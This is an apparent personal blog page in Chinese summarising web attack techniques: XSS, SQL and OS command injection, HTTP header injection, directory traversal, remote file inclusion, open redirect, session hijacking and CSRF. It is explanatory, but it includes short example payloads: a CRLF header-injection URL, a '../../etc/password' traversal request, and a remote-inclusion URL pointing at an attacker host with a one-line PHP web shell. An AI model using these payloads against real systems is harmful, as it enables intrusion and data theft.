<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>web攻击模式 | 周非凡个人博客</title>
    <meta name="description" content="Vue 驱动的静态网站生成器">
    
    
    <link rel="preload" href="/assets/css/0.styles.d01e3fed.css" as="style"><link rel="preload" href="/assets/js/app.c9da9db2.js" as="script"><link rel="preload" href="/assets/js/2.febc0262.js" as="script"><link rel="preload" href="/assets/js/49.c0de9630.js" as="script"><link rel="prefetch" href="/assets/js/10.0253064e.js"><link rel="prefetch" href="/assets/js/11.175002a3.js"><link rel="prefetch" href="/assets/js/12.c9c2623b.js"><link rel="prefetch" href="/assets/js/13.a252b052.js"><link rel="prefetch" href="/assets/js/14.6a53dc1e.js"><link rel="prefetch" href="/assets/js/15.84088994.js"><link rel="prefetch" href="/assets/js/16.09fbb166.js"><link rel="prefetch" href="/assets/js/17.38b70eaf.js"><link rel="prefetch" href="/assets/js/18.24a31878.js"><link rel="prefetch" href="/assets/js/19.e58abf47.js"><link rel="prefetch" href="/assets/js/20.a4e1f7ec.js"><link rel="prefetch" href="/assets/js/21.520b96e8.js"><link rel="prefetch" href="/assets/js/22.8455ead8.js"><link rel="prefetch" href="/assets/js/23.012b6e4c.js"><link rel="prefetch" href="/assets/js/24.90bca786.js"><link rel="prefetch" href="/assets/js/25.0b9867c9.js"><link rel="prefetch" href="/assets/js/26.5835b50d.js"><link rel="prefetch" href="/assets/js/27.90bf64b9.js"><link rel="prefetch" href="/assets/js/28.8b2856a2.js"><link rel="prefetch" href="/assets/js/29.4f0f0797.js"><link rel="prefetch" href="/assets/js/3.b8e8b8dc.js"><link rel="prefetch" href="/assets/js/30.ec214258.js"><link rel="prefetch" href="/assets/js/31.19d008c9.js"><link rel="prefetch" href="/assets/js/32.e2e7fb69.js"><link rel="prefetch" href="/assets/js/33.e7250e7c.js"><link rel="prefetch" href="/assets/js/34.6af80751.js"><link rel="prefetch" href="/assets/js/35.8c6fd912.js"><link rel="prefetch" href="/assets/js/36.abacb260.js"><link rel="prefetch" href="/assets/js/37.872fafd6.js"><link rel="prefetch" href="/assets/js/38.c11a6237.js"><link rel="prefetch" href="/assets/js/39.0251e2ab.js"><link rel="prefetch" href="/assets/js/4.a97bd63a.js"><link rel="prefetch" href="/assets/js/40.490030c9.js"><link rel="prefetch" href="/assets/js/41.ae009df1.js"><link rel="prefetch" href="/assets/js/42.733a49d6.js"><link rel="prefetch" href="/assets/js/43.6b0719ec.js"><link rel="prefetch" href="/assets/js/44.8abd3659.js"><link rel="prefetch" href="/assets/js/45.7e9da5d6.js"><link rel="prefetch" href="/assets/js/46.69831b02.js"><link rel="prefetch" href="/assets/js/47.0187e2c6.js"><link rel="prefetch" href="/assets/js/48.d573af72.js"><link rel="prefetch" href="/assets/js/5.9f3cace6.js"><link rel="prefetch" href="/assets/js/50.dd93629a.js"><link rel="prefetch" href="/assets/js/51.0de94388.js"><link rel="prefetch" href="/assets/js/52.f40156a5.js"><link rel="prefetch" href="/assets/js/53.cd0087a3.js"><link rel="prefetch" href="/assets/js/54.dc27779e.js"><link rel="prefetch" href="/assets/js/55.e83361b5.js"><link rel="prefetch" href="/assets/js/56.e98fbba1.js"><link rel="prefetch" href="/assets/js/57.29f5154b.js"><link rel="prefetch" href="/assets/js/58.2a266b80.js"><link rel="prefetch" href="/assets/js/59.a0a6d426.js"><link rel="prefetch" href="/assets/js/6.ea94c1bd.js"><link rel="prefetch" href="/assets/js/60.431c1ff3.js"><link rel="prefetch" href="/assets/js/61.f3c25606.js"><link rel="prefetch" href="/assets/js/62.df795bbf.js"><link rel="prefetch" href="/assets/js/7.954bbdf7.js"><link rel="prefetch" href="/assets/js/8.5ac09073.js"><link rel="prefetch" href="/assets/js/9.1c3b9112.js">
    <link rel="stylesheet" href="/assets/css/0.styles.d01e3fed.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container no-navbar"><!----> <div class="sidebar-mask"></div> <aside class="sidebar"><!---->  <ul class="sidebar-links"><li><section class="sidebar-group depth-0"><p class="sidebar-heading open"><span>CSS 专题</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/doc/css/1.html" class="sidebar-link">css 常用知识点</a></li><li><a href="/doc/css/2.html" class="sidebar-link">清除浮动</a></li><li><a href="/doc/css/3.html" class="sidebar-link">三大经典问题</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>HTML 专题</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/doc/html/1.html" class="sidebar-link">浏览器解析流程</a></li><li><a href="/doc/html/2.html" class="sidebar-link">viewport原理</a></li><li><a href="/doc/html/3.html" class="sidebar-link">meta标签</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>JS 专题</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/doc/js/1-1.html" class="sidebar-link">堆栈调用（上篇）</a></li><li><a href="/doc/js/1-2.html" class="sidebar-link">堆栈调用（下篇）</a></li><li><a href="/doc/js/2.html" class="sidebar-link">作用域与闭包</a></li><li><a href="/doc/js/3.html" class="sidebar-link">this绑定解析</a></li><li><a href="/doc/js/4-1.html" class="sidebar-link">call、apply原理与使用场景</a></li><li><a href="/doc/js/4-2.html" class="sidebar-link">bind 的原理与使用场景</a></li><li><a href="/doc/js/5-1.html" class="sidebar-link">浅拷贝概念以及实现原理</a></li><li><a href="/doc/js/5-2.html" class="sidebar-link">深拷贝概念以及实现原理</a></li><li><a href="/doc/js/6-1.html" class="sidebar-link">原型与继承之基本概念</a></li><li><a href="/doc/js/6-2.html" class="sidebar-link">原型与继承之（6种继承方案）</a></li><li><a href="/doc/js/7.html" class="sidebar-link">事件机制</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>工具函数 专题</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/doc/utils/1.html" class="sidebar-link">常见的JS方法</a></li><li><a href="/doc/utils/2.html" class="sidebar-link">常见的正则表达式</a></li><li><a href="/doc/utils/3.html" class="sidebar-link">常用的时间处理方法</a></li><li><a href="/doc/utils/4.html" class="sidebar-link">常用的金额处理方法</a></li><li><a href="/doc/utils/5.html" class="sidebar-link">继承和原型链demo</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>HTTP 专题</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/doc/http/1.html" class="sidebar-link">常见的14种响应状态码</a></li><li><a href="/doc/http/2.html" class="sidebar-link">Http首部字段</a></li><li><a href="/doc/http/3.html" class="sidebar-link">Https介绍</a></li><li><a href="/doc/http/4.html" class="sidebar-link">Web的攻击技术</a></li><li><a href="/doc/http/5.html" class="sidebar-link">Http 发展历史</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>Vue 专题</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/doc/vue/1.html" class="sidebar-link">Vue 双向绑定的原理</a></li><li><a href="/doc/vue/2.html" class="sidebar-link">Vue 踩坑总结</a></li><li><a href="/doc/vue/3.html" class="sidebar-link">Vue 生命周期详解</a></li><li><a href="/doc/vue/4.html" class="sidebar-link">Vuex 基本用法</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>Node 专题</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/doc/node/1.html" class="sidebar-link">用node撸一个前端自动化发布工具</a></li></ul></section></li><li><section class="sidebar-group depth-0"><p class="sidebar-heading"><span>项目总结</span> <!----></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/doc/project/1.html" class="sidebar-link">H5项目总结</a></li><li><a href="/doc/project/2.html" class="sidebar-link">首页优化项目总结</a></li><li><a href="/doc/project/3.html" class="sidebar-link">vue 输入限制</a></li><li><a href="/doc/project/4.html" class="sidebar-link">搜车库项目总结</a></li></ul></section></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h3 id="web攻击模式"><a href="#web攻击模式" aria-hidden="true" class="header-anchor">#</a> web攻击模式</h3> <h4 id="_1、-主动攻击"><a href="#_1、-主动攻击" aria-hidden="true" class="header-anchor">#</a> 1、 主动攻击</h4> <p>主动攻击是指攻击者通过直接访问Web应用，把攻击代码传入的攻击模式。该攻击针对服务器上的资源，因此前提是要攻击者能够访问服务器上的资源。常见的有sql注入攻击和OS命令注入攻击。</p> <h4 id="_2、-被动攻击"><a href="#_2、-被动攻击" aria-hidden="true" class="header-anchor">#</a> 2、 被动攻击</h4> <p>指攻击者设计圈套诱导用户触发攻击动作，从而利用用户的操作已经身份对web服务器发动间接的攻击。</p> <p>具体步骤：
1、诱导用户触发已经设置好的陷阱，而陷阱启动发送已嵌入攻击代码的HTTP请求。
2、当用户掉入设计的陷阱后，他的浏览器或邮件客户端就会触发这个陷阱。
3、浏览器发送含有攻击代码的HTTP请求到web服务器，运行攻击代码。
4、执行攻击代码后，可能会导致用户重要的Cookie以及其他个人信息重要被窃。最典型的攻击模式就是跨站脚本攻击和跨站点请求伪造。</p> <p><img src="http://p2w3pqeze.bkt.clouddn.com//TuJieHttp/11-1.png" alt="image"></p> <h3 id="输出转义不完全的攻击方式"><a href="#输出转义不完全的攻击方式" aria-hidden="true" class="header-anchor">#</a> 输出转义不完全的攻击方式</h3> <ul><li>客户端验证</li> <li>服务端验证
<ul><li>输入值的验证</li> <li>输出值的转义</li></ul></li></ul> <p>虽然可以用JavaScript在客户端进行校验，但是客户端的校验不适合作为安全防范的对策，而仅仅是起到提高UI体验的作用。</p> <p>Web 应用端输入值验证通常是指检查是否是符合系统业
务逻辑的数值或检查字符编码等预防对策。
从数据库或文件系统、HTML、邮件等输出Web 应用处理的数据之际,针对输出做值转义处理是一项至关重要的安全策略。当输出值转义不完全时，会因触发攻击者传人的攻击代码，而给输出对象带来损害。</p> <h4 id="利用该漏洞的攻击方式"><a href="#利用该漏洞的攻击方式" aria-hidden="true" class="header-anchor">#</a> 利用该漏洞的攻击方式</h4> <p>1、 跨站脚本攻击（XSS）
跨站脚本攻击( Cross-Site Scripting,XSS) 是指通过存在安全漏洞的Web 网站注册用户的浏览器内运行非法的HTML 标签或JavaScript进行的一种攻击。动态创建的HTML 部分有可能隐藏着安全漏洞。
影响点。</p> <ul><li>利用虚假输入表单骗取用户的个人信息。</li> <li>利用非法脚本盗取用户的Cookie值，从而伪造身份，执行恶意的操作。</li> <li>显示虚假信息。</li></ul> <p>2、Sql注入攻击
在web请求中加入攻击代码，导致web应用程序执行那段恶意的sql语句。该攻击直接威胁到数据库，会导致个人信息的泄露、篡改等安全问题。
影响点</p> <ul><li>非法查看或篡改数据库内的数据</li> <li>规避认证（如用户登录验证）</li> <li>执行和数据库服务器业务相关的程序</li></ul> <p>利用用户的输入且不执行相关的转义操作，直接把输入的值当做查询条件写入sql语句中，就会出现sql注入攻击的安全漏洞。</p> <p>3、OS命令注入攻击</p> <pre><code>通过HTTP请求在web服务器执行非法的操作系统命令。通常就是让web服务器执行非法的shell脚本操作，来达到攻击的目的。
</code></pre> <p>4、http首部注入攻击</p> <pre><code>攻击者在http响应首部字段内插入换行符，并且添加任意的响应字段或主体，属于被动攻击。
</code></pre> <p>方式：
url后添加换行符（%0D%0A）伪造字段名：字段值 来达到攻击的效果。</p> <p>访问http://www.exampel.com/?id=2</p> <div class="language- extra-class"><pre class="language-text"><code>location:http://www.exampel.com/?id=2
</code></pre></div><p>访问攻击url http://www.exampel.com/?id=2%0D%0ASet-Cookie:+UID=1234</p> <div class="language- extra-class"><pre class="language-text"><code>location:http://www.exampel.com/?id=2
Set-Cookie: UID=1234
</code></pre></div><p>当然也可以影响显示的主体
url http://www.exampel.com/?id=2%0D%0ASet-Cookie:+UID=1234%0D%0%0D%0</p><html>尼玛</html>&lt;!--<p></p> <div class="language- extra-class"><pre class="language-text"><code>location:http://www.exampel.com/?id=2
Set-Cookie: UID=1234
%0D%0A
&lt;html&gt;尼玛&lt;/html&gt;&lt;!--(原来的页面就被注释掉了)
</code></pre></div><p>影响点</p> <ul><li>设置任何Cookie信息</li> <li>重定向到任意url</li> <li>显示任意的主体</li></ul> <p>5、邮件首部注入攻击</p> <p>6、目录遍历攻击</p> <p>对服务器上原本不公开的目录进行非法访问，通常的做法就是利用url中的相对路径去恶意访问机密文件。
合法访问的文件</p> <div class="language- extra-class"><pre class="language-text"><code>http://example.com/read.php?logo=001.png
</code></pre></div><p>非法访问</p> <div class="language- extra-class"><pre class="language-text"><code>http://example.com/read.php?logo=../../etc/password
</code></pre></div><p>7、远程文件包含攻击
远程文件包含漏洞是指当部分脚本内容需要从其他文件读入时，攻击者利用指定外部服务器的URL 充当依赖文
件，让脚本读取之后，就可运行任意脚本的一种攻击。</p> <p>攻击请求</p> <div class="language- extra-class"><pre class="language-text"><code>http://example.com/read.php?mod=http://nima.com/cmd.php.cmd=ls
</code></pre></div><p>然后在自己的服务器上准备了一段攻击代码</p> <div class="language- extra-class"><pre class="language-text"><code>&lt;? system($_GET['cmd]) ?&gt; 
</code></pre></div><p>这样攻击者就可以在自己的服务器上对目标服务器执行指定的OS命令了。</p> <h3 id="因web设置或者设计上的一些缺陷引发的安全问题"><a href="#因web设置或者设计上的一些缺陷引发的安全问题" aria-hidden="true" class="header-anchor">#</a> 因web设置或者设计上的一些缺陷引发的安全问题</h3> <h4 id="强制浏览"><a href="#强制浏览" aria-hidden="true" class="header-anchor">#</a> 强制浏览</h4> <p>对一些非公开的文件（涉及到权限的），通过非法的手段进行浏览。
造成的影响</p> <ul><li>泄露用户个人重要的信息</li> <li>泄露原本需要访问权限才可以查阅的信息内容</li> <li>泄露未公开的文件</li></ul> <h4 id="不正确的消息处理"><a href="#不正确的消息处理" aria-hidden="true" class="header-anchor">#</a> 不正确的消息处理</h4> <p>1、Web应用抛出的错误消息
举例说明：
登录界面用户输入账号密码没有通过验证时，不需要做在输入账号有误时提示『帐号不存在』，帐号正确而密码错误时提示『密码不正确』等，而是统一提示『密码不正确』。不然会暴露给攻击者暴露太多的信息，增加账号被盗的风险。</p> <p>2、数据库等系统抛出的错误消息
执行查询时，sql报错，直接将报错信息显示到界面上，这样就可能暴露数据库以及查询脚本的信息。</p> <p>3、开放重定向</p> <p>开放重定向是一种对指定的任意URL 作重定向跳转的功能。而于此功能相关联的安全漏洞是指，假如指定的重定向URL到某个具有恶意的Web网站,那么用户就会被诱导至那个Web网站。</p> <div class="language- extra-class"><pre class="language-text"><code>//正常的重定向
http://taobao.com?redirect=http://www.tmail.com

//攻击者篡改的重定向
http://taobao.com?redirect=http://www.nima.com
</code></pre></div><h3 id="因session管理疏忽引发的安全漏洞"><a href="#因session管理疏忽引发的安全漏洞" aria-hidden="true" class="header-anchor">#</a> 因session管理疏忽引发的安全漏洞</h3> <p>session是用来管理用户的状态的必备功能，如果出现漏洞，就会导致用户的认证状态被窃取。</p> <h4 id="session劫持"><a href="#session劫持" aria-hidden="true" class="header-anchor">#</a> session劫持</h4> <p>攻击者通过某种方式拿到了用户的session ID,并用其伪装成用户，做一些非法的操作从而达到攻击的目的。session ID 中记录客户端的Cookies等信息，服务端会将Session ID 与认证状态进行一对一匹配管理。</p> <p>攻击者获得session ID 的方式</p> <ul><li>通过非正规的方法推测session ID</li> <li>通过窃听或XSS攻击盗取Session ID</li> <li>通过会话固定攻击强行获取Session ID</li></ul> <p>攻击案例图：</p> <p><img src="http://p2w3pqeze.bkt.clouddn.com//TuJieHttp/11-2.png" alt="image"></p> <h4 id="session-固定攻击"><a href="#session-固定攻击" aria-hidden="true" class="header-anchor">#</a> session 固定攻击</h4> <p>强制用户使用攻击者指定的session ID, 属于被动攻击。
案例图：
<img src="http://p2w3pqeze.bkt.clouddn.com//TuJieHttp/11-3.png" alt="image"></p> <h4 id="跨站点请求伪造"><a href="#跨站点请求伪造" aria-hidden="true" class="header-anchor">#</a> 跨站点请求伪造</h4> <p>跨站点请求伪造( Cross-Site Request Forgeries,CSRF) 攻击是指攻击者通过设置好的陷阱,强制对已完成认证的用户进行非预期的操作，属于被动攻击。</p> <p>案例图：</p> <p><img src="http://p2w3pqeze.bkt.clouddn.com//TuJieHttp/11-4.png" alt="image"></p> <p>当用通过的认证的用户访问含有攻击者部署恶意代码的留言网页后，会自动触发img标签中的http请求，执行评论操作，添加『你好』评论。</p></div> <footer class="page-edit"><!----> <!----></footer> <!----> </main></div><div class="global-ui"></div></div>
    <script src="/assets/js/app.c9da9db2.js" defer></script><script src="/assets/js/2.febc0262.js" defer></script><script src="/assets/js/49.c0de9630.js" defer></script>
  </body>
</html>
